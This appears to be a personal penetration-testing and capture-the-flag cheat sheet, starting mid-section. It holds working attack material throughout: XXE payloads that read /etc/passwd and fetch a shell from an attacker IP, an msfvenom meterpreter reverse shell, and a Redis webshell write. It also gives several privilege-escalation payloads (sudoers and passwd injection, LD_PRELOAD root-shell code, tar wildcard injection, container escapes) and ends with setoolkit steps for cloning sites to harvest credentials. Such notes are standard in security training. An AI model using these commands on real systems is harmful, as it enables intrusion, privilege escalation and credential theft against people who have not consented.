we canot use whitespaces in this attack so either we can use the $IFS command instead of a space

#### THis is used to read local files on server
<!- - ?xml version="1.0" ?- ->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userinfo>
<user>
&ent;
</user>
</useinfo>

WE can also use the above command and replace file with expect command

### REmote xxe


we can use this to upload a shell to server

instead of .php shell we should make .txt shell with msfvenom because these attacks sometimes run the php shell 
on our machine

> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f raw > shell.txt

<!- - ?xml version="1.0" ?- ->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "expect://curl$IFS'10.4.30.255:80/shell.php'"> ]>
<userinfo>
<user>
&ent;
</user>
</useinfo>



## FIle uploads attacks

try different extensions like .pHp,.php5,.phtml etc 
there are diffferent extensions for single technology

mime-type shows us content type inside a file regardless of its extension,we can change this and trick the server

we can check a file content type by following

> file --mime-type filname.extension

sometimes try changing the content type in burp because servers verify sometimes from there

for example we can change the application/x-php to image/jpeg if server accepts images etc

#### Hidiing malcious code in an image

use a white jpg image

  #!/bin/python3
hideme=open('file.jpg','rb').read()
hideme+=open('test.php','rb').read()
open('hideme.php3','wb').write(hideme)

























# #######


# ENUMURATION

### Rustscan 

> **Rustscan to scan for open ports and then use nmap for heavy scanning**

rustscan -a <IP>

### Nmap

nmap -p <openports> -T4 -A <IP>      


nmap -p <openports> -T4 -A <IP> --script vuln       Detect vulneribilties of discovered services



### FTP

ftp <IP>

try anonymous:anonymous credentials for Null Sessions

dir            command to list directories

get <file>     get a copy of file on local machine

put <file>     upload a file to ftp server


### Get Valid domain name 

If we are approaching a system and dont know its domain name ,we can try to retreive it from server itself

First  use a valid header to see the response

> curl -H 'Host: IP' "http://IP/'"

Now use invalid host to see if server gives us an error

> curl -H 'Host: http://IP' "http://IP/'"

### ssh

-  We can directly send commands via ssh

ssh name@ip 'whomai';id


- sometimes we get kicked from ssh or unstable shell so we can specify the type of shell we wan to use

ssh name@ip -t sh  
    
    or
    
ssh name@ip -t bash     



### SMB 


- smbclient -L //IP/      displays shares on samba server

- smbclient //IP/<share>       access that share

- smbclient -L //IP/ -U username%password       authenticated login if have credentials

- smbget -T smb://IP/<share>   get copy of that share on local machine


- enum4linux -a <IP>              detailed mapping of smb server :)

- nmap -p139,445 --script=smb.brute IP     nmap script whihc tries to bruteforce shares credentials

### RDP

rdesktop -u <username> -p <password> <IP:port>             connect to a remote windows machine

### Pop3 mail

- If we have a mail server,we can connect to it using telnet ip port

- If we want to aithenticate then type USER username and PASS password


$ telnet pop.gmx.net 110
Trying 212.227.17.185...
Connected to pop.gmx.net.
Escape character is '^]'.
+OK POP server ready H migmx028 0MAbjW-1YwF4D0ml8-00BiVl
USER spamaccount80@gmx.de
+OK password required for user "spamaccount80@gmx.de"
PASS typeyourpassword


- We can use socat for encrypted sessions

$ socat - OPENSSL:pop.gmx.net:995
+OK POP server ready H migmx113 0MC062-1Yzese0KO7-00AVNE
USER spamaccount80@gmx.de
+OK password required for user "spamaccount80@gmx.de"
PASS typeyourpassword
+OK mailbox "spamaccount80@gmx.de" has 13518 messages (1917 



- Once logged in we can interact with server as

> LIST (displays the number of inbox messages)

> RETR (retreives the specified message)


### squid proxy or any other proxy

- If we see any proxy running on any port then we have to access that proxy using proxychains

1. Go to /etc/proxychains4.conf and below there add http ipaddress port

2. now we can use any commands with proxychains and will bypass the proxy running on target server

3. We can do port scan with proxychains to see any open ports which were being blocked before

4. Now we will tunnel all the further exploitation or enumuration with via proxychains





### Port knocking


we use knockd for port knocking

port knocking is used to open critical ports on demand. The connector basically follows a sequence usually specified in a config file and knock some ports in a given amount of time in a given sequence and the secure port is then opened

Suppose we have the secret ports pattern for e.g 1111 2222 3333 4444

we can port knock using the sequence

knock IPAddress 1111 2222 3333 4444

### Redis
 
  Redis is an open source, in-memory data structure store, used as a database, cache and       message broker.
 
 If redis is open and we have its credential we can login from cli
  
> redis-cli -h $ip -a 'password'

-NOAUTH command to check if authorization is required or not

- keys * (this command list the dbcontents)

-  lrange db_keyname 1 100 (if type command doesnt display the contents		)

> Enumerating files

- eval dofile("/etc/passwd") 0
- eval "dofile('c:\\\users\\\path')" 0

> dumping redid db file

- eval dofile('/var/data/app/db.conf');return(db.password); 0
 
 #### Getting rce through redis
 
 we can get webshell through redis if we have write access to a directory whithin web root or accessible by some other means
 
> nc -nv $ip port
 
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>" # Our code goes here
OK
10.85.0.52:6379> save
OK

Or
the eval dofile allows us to read system sensitive files via redis

redis-cli -h 10.10.188.12 -p 6379 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0



we can also use netcat to connect to redis

> nc $ip port

### Rsync

Rsync works like ftp and is used to synchronise files in shared environment

### To see available shares
   
>  nmap -sV --script "rsync-list-modules" -p <PORT> <IP>     
                       OR
>  rsync -av --list-only rsync://192.168.0.123/                        
   
   ##### To see the available shared content
     
     
> rsync  $ip::sharename      
     
     or
     
>  rsync -av --list-only rsync://192.168.0.123/shared_name
     
                          

#### To copy the contents to our local machine
     
> rsync -av rsync://IP:PORT/shared_name <localpath>

#### UPload to rsync server

> rsync ./myfile.txt $ip::sharename/restofpath

we can also upload a folder

> rsync -r ./myfolder $ip::sharename/restofpath 
 
 WE can also upload files in target system using rsync
 IN below example we are uploading ssh key in users directory using rsync
 
> rsync -av ~/.ssh/id_rsa.pub rsync://username@$ip:873/UserHomeDirectory/.ssh/authorized_keys
 
 
         

## Mqtt
 Mqtt is a iot communication service . If this is running we can enumarate this for any information gathering
 
 1. First insatll mqqt python client shell from github  (https://github.com/bapowell/python-mqtt-client-shell)
 
 2. Then run it and select the protocol version of mqtt(WE can try different ones if one dont work)
 
 3. Now type connection in shell and in next prompt type host IPaddress. Do same for PORT in next prompt
 
 4. NOw type connect and we are in
 
 
>  https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto


## VNC (Similiar to RDP)

if we have a encrypted password we can decrypt it online by searching vnc password decrypt

or if we have a password file we can use it directly to authenticate

> vncviewer $IPADDRESS:$PORT -passwd passwdfile


# #######


# POST EXPLOITATION
 

### Kernel EXploits

cat /etc/*release
uname -a

### Find file having specific name and case insensitive


find / -type f -iname "*stringfilename*"

### Finding harcoded credentials in all files of given directory

we can put passwords or credentials string in double quotes.Also we can specify any directory we want instead of /

grep -iR "string to find" / 2> /dev/null



### C exploits
 
Most exploits are written to gcc compatbility

if target doesnt have gcc we cannot run exloit properly but if target has cc compiler thean we can make our 
exploit compatible to cc by command

> sed -i "s/gcc/cc/g" priv.c

Now just compile the exploit and run it



   
### Cronjobs
**What to Look for: if cronjobs are being run by root or any other user then see if you can write to that file or not**
**If you cannot write to the file then try to duplicate the path of that file and make a copy of that file and its path to execute your shell**



-cat /etc/crontab

- cronjob -l   

- crontab -u <user> -e 


### sudo 

sudo -u#-1 <command>


### tee binary

if we have sudo access to tee binary then that means we can write any code in a priveleged file using tee

- we can either provide current user full sudo access using

> echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo /usr/bin/tee -a /etc/sudoers

we can also  add a new user with root priveleges by writing to /etc/passwdd

below hash is of password "hello" and user "user"

the hash can be made using openssl

**REmember to escape the dollars signs  by \ when echoing**

> echo "user:\$1\$eW7g5Xc2\$iev85cxY0fh2mMp3DWUEv.:0:0:root:/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd




### File Permissions



- Suid:    find / -type f -perm -4000 2>/dev/null

- Sgid:    find / -type f -perm -2000 2>/dev/null

- World readable:   find / -type f -readable -user <username> 2>/dev/null
 
- World Writable:   find / -type f -writable -user <username> 2>/dev/null

### Capabilities(Similiar to Suid permissions ) 

getcap -r / 2>/dev/null



### Sensitive Information (configs etc)

> cat /var/apache2/config.inc

> cat /var/lib/mysql/mysql/user.MYD

> cat /root/anaconda-ks.cfg

- See user history by  cat ~/.*history

- cat ~/.ssh/authorized_keys

- cat ~/.ssh/identity.pub

- cat ~/.ssh/identity

- cat ~/.ssh/id_rsa.pub

- cat ~/.ssh/id_rsa

- cat ~/.ssh/id_dsa.pub

- cat ~/.ssh/id_dsa

- cat /etc/ssh/ssh_config

- cat /etc/ssh/sshd_config

- cat /etc/ssh/ssh_host_dsa_key.pub

- cat /etc/ssh/ssh_host_dsa_key

- cat /etc/ssh/ssh_host_rsa_key.pub

- cat /etc/ssh/ssh_host_rsa_key

- cat /etc/ssh/ssh_host_key.pub

- cat /etc/ssh/ssh_host_key

- /var/backups

- /var/mail

- /var/spool/mail

### Path Manipulation

> **Suppose a binary  /bin/update is not on secure path and can be vulnerable then we can make a custom binary and replace it with**
> **the existing binary.So whenever this binary is executed either by user command or by cronjob,our custom code gets executed.**

**We can also  add any custom script or program in our secure path** 

**export PATH="<FilePath>/:$PATH"**

### NFS(Network File System)

1. showmount -e <IP>       Displays mount Path

2. mount -t nfs <IP>:/<mountpath> <pathtomounto>     mount the file system on your local machine
    
             OR
2. mount -o rw,vers=2  <IP>:<mountpath>  <pathtomount in our machine>

  #### **RootSquash**
  
   - when we mount a nfs on a machine, if we are root user when nfs is mounted the root privilege 
    for that nfs is squashed for security purpose.Else we can just easily access the whole mounted 
   nfs. This process is by dedault in modern nfs and is called rootsquashing. The root uid is then
   treated as nobody user and group.
  
   -Following file contains the nfs config.If no_root_squash is not present,then we can write to the file and add no_root_squash in the desired mount rules.
     

 > cat /etc/exports
 





### Mount 

  >   df -h      **List all the device using disk resources,can be used to see external mounted devices like usb etc**

  >   mount     **Shows mounted device on the system**   
 
 
 - To see unmounted filesystem 

 >   cat /etc/fstab

### lxd(container)


if having issue installing alpine docker

`https://github.com/saghul/lxd-alpine-builder`

1.  #### Installing alpine on your local machine  (One time step)

   1.  git clone https://github.com/saghul/lxd-alpine-builder
   2.  cd lxd-alpine-builder
   3.  sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
   4.  sudo ./build-alpine -a i686

2.  upload the tar file to victim machine

3. #### Building a container
  
   1. lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  (add a new container)
  
   2.  lxc image list   (list all images in the container)   

   3.   lxc init myimage ignite -c security.privileged=true

   4.  lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  (mounting root filesystem on container)  

   5.  lxc start ignite

   6.  lxc exec ignite /bin/sh

4. #### Accessing the victim root filesystem

   1.  cd /mnt/root/root         
  
  >  The /root we are accessing is basically a copy of real /root of victim so basically we are in a cloned
  >  version of original /root so any changes here will not effect the real /root filesystem . We can read the 
  >   contents of /etc/shadow and crack the hash and then access as root on real /root filesystem.
  
  
  **`https://github.com/initstring/lxd_root`**

### sudo -l
  
    #### apache2

 >   If apache2 is allowed as sudo , we can use apache binary to read first line of files to which
 >   we dont have any access like  /etc/shadow   which will dump root hash.
     
    **sudo /usr/bin/apache2 -f /etc/shadow**      
 
    #### LD_PRELOAD
   
  >  If env_keep=LD_PRELOAD is present when sudo -l ,that means whenever we use sudo a ldpreload shared
  >  object is loaded. So we can manipulate this and make our shared object and force the LD_PRELOAD environment
  > variable to load our custom sharedobject which will be basically our root shell

   -  **To create a root shell file make a c file named preload.c**
 
  > #include <stdio.h>
 
  > #include <sys/types.h>
 
  > #include <stdlib.h>

  >  void _init(){unsetenv("LD_PRELOAD");setresuid(0,0,0);system("/bin/bash -p");}

  - **Now Compile the code**
 
  > gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

  - **Now use preload to get root**
  
  >  sudo LD_PRELOAD=/tmp/preload.so <any binary allowed in sudo -l>


     
    #### LD_LIBRARY_PATH

   >  If we see env_keep=LD_LIBRARY_PATH when sudo -l we can also manipulate it. This is used by system
   >  to see which shared libraries will be used by a certain binary or program.We can see the shared
   >  libraries used by a binary and then make a similiar our own file with name of a used shared library
   >   system will load our code instead of the SO code.
   
   >  We can use following command to see shared libraries used by a binary
    
   -  ldd <binary absolute path>

   - **To create a root shell  make a c file library_path.c**

  > #include <stdio.h>
 
  > #include <stdlib.h>

  >  static void hijack()_attribute_((constructor));

  >  void hijack(){unsetenv("LD_LIBRARY_PATH");setresuid(0,0,0);system("/bin/bash -p");}

  - **Now Compile the code**
 
  > gcc -fPIC -shared -nostartfiles -o <same name as any shared library> library_path.c

  - **Now use preload to get root**
  
  >  sudo LD_LIBRARY_PATH=<custom SO name> <any binary allowed in sudo -l> 

    #### Python library hijacking

    If a scripts gets executed by root or has suid set , and we cant write to it. we can create py files of the libraries which the script is importing. Create files in our current directory or if any ptython path is writable and make libraryname.py file with malicious code


    From python documentation
    ```python

     When a module named spam is imported, the interpreter first searches for a built-in module with that name. If not found, it then searches for a file named spam.py in a list of directories given by the variable sys.path. sys.path is initialized from these locations:

    The directory containing the input script (or the current directory when no file is specified).

    PYTHONPATH (a list of directory names, with the same syntax as the shell variable PATH).

    The installation-dependent default (by convention including a site-packages directory, handled by the site module).


    ```

   


 ### Cronjobs

   -  cat /etc/crontab   *System wide cronjobs*

   -  cat /var/spool/cron or /var/spool/cron/crontab  *User cronjobs*

    
 ### Path Environment variables
 
  
  -  If a file running as root or has suid or sgid set and it uses any binary in its code, then 
     we can overwrite that binary if we can write to any of the path .If the binary is being run 
     with absolute path then we have only one choice and that is to change the binary from that path
     if directory is writable. WIth absolute payh we can also use the shell Function abuse technique


  -  When abusing crobjobs the PATH seen in /etc/crontab is the directories in which System look
      for the binary being ran as cronjob. If any of that directory is writable then we can right
      own binary with the original binary name and copying that binary to some other location for later restoration
   

   >  If a Cronjob is running and the script is without an absolute path and any one of PATH variable
   >  directories are writable ,then we can make our own file with name of that cronjob file and our file
   >  file will be executed insteadof the original

   - Every User has its own PATH env variable and we can use those with every context of that user
 
   
## Custom  binary hijacking

if a custom binary have suid bit set or is being ran as  privilege user we can use this to escalate.

1. First analyse it with ghidra or ltrace or strace
2. See if it uses any system binary with no absolute path then we can simply make a binary of that name in our $HOME and add home dir to out PATH env variable.
3. If the binary uses any system Environmnet variables then we can add our malicious code in that environment variable and when the binary executes,it executes that env variable and it contains our malicious code

For e.g   a binary is using $PWD env variavble . We can add our code in this env variable like 
export PWD=";/bin/bash" 

or

export PWD=\$\(/bin/bash\) 
 
 
sometimes a binary is also using a custom environment variable when analysed.so then we can create a new env variable with that name and add our malicious code 
 
 
 
 
   
### Shell Function Abuse

   **This works for =<4.2-048**  
  
- Suppose if a file or program running as root or has suid set or sgid set and it utilizes bash
     built in functions like e.g /usr/sbin/service then we can rebuilt this function with our code
     embedded inside. As Follows
      
   >    function /usr/sbin/service {/bin/bash -p; }
   
   >    export -f /usr/sbin/service

  **This works for bash =<4.4**
 
-  When a file either running as root or has a suid or sgid set and it uses bash to do some kinf of work
 then we can abuse it as well. A env variable SHELLOPTS when set to xtrace allows us to append some values in the file.a env varibale named PS4 can be specified when running the targeted binary
 or file in debugging mode. We can set the PS4 var to any command which will be executed with fileowner
 priveleges . Since File owner is either root or has suid set commands will be executed as root


 >  env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash)' <binarytobeexploited path >
 
   

   ### Spawning Root Shell 

   >  If we can write to a file which is run by root ,then we can spawn a root shell inside our shell
   > This is done by copying the /bin/bash to tmp directory and then giving it suid bit. When we run that 
   > copy of bash we will get root
   
   1.  cp /bin/bash  /tmp/rootbash
   2. chmod +s /tmp/rootbash

   > Add above in a file being run by root and now we can run the /tmp/rootbash - p to get root

       #### C ROOT SPAWN
         
   - we can use this C code to spawn root once compiled
     
   > int main(){setuid(0);system("/bin/bash -p");} 


       #### PYTHON ROOT SPAWN

   -   This python code can directly spawn a root shell
  
   >  import os;os.system("/bin/bash ")
 

   > import pty;pty.spawn("/bin/bash ")



  ### Wildcards
  
  
  #### SUmmary
  
      If a wildcard with tar is being  used in cronjob or some file running as root
      
      create your malicious shell payload in the directory where tar is executing and processing
      
      -  echo "cp /bin/bash /tmp/rootshell;chmod +s /tmp/rootshell" > esc.sh
      -  echo "" > "--checkpoint-action=exec=sh esc.sh"
      -  echo "" > --checkpoint=1
 
 
      When the binary will run in cronjob it will execute like this
         
       > so it will look like tar file.tar.gz --checkpoint-action=exec=sh esc.sh 
  


 ### Docker Group
 
- If we are part of a docker group then we can escalate using that.First see available docker
- images by following command

> docker images

- Now we can either use alpine or any other docker but in ctfs we cannot do that because internet access is 
- not possible so we use any of the image found from above command

> docker run -v /:/mnt -it <docker image>

            OR
> docker run -v /:/mnt --rm -it <docker image> chroot /mnt sh

- we now cd into mnt and we have entire root directory access.We can also give / instead of /root
  
         

# Social Engineering

We can use setoolkit to use various social enginerring techniques in real world scenario

One major thing we can do is clone a website with this tool and we can gather credentials of that website

### Clone a website to gather credentials

First we will set the config file so we can host the clone server

sed -i 's/WEB_PORT=80/WEB_PORT=100/g' /etc/setoolkit/set.config

Now open setoolkit

1. Go to 2 which is website attack vectors

2. Go to 3 which is credentials harvestor

3. go to 2 to clone a website

4. Now provide a url on which we have to host the server and the port will the one above in config(100)

5. Now enter the url of website logins(usually) which we want to clone
 












# 	#######    

